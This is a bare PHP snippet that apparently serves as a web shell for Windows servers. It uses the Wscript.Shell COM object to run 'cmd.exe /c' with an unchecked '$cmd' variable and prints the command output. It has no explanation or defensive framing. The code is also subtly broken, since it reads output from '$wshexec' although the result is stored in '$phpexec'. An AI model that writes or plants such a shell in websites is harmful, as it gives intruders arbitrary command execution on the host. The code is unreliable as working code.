<?php
$phpwsh=new COM("Wscript.Shell") or die("Create Wscript.Shell Failed!");
$phpexec=$phpwsh->exec("cmd.exe /c $cmd");
$execoutput=$wshexec->stdout();
$result=$execoutput->readall();
echo $result;
?>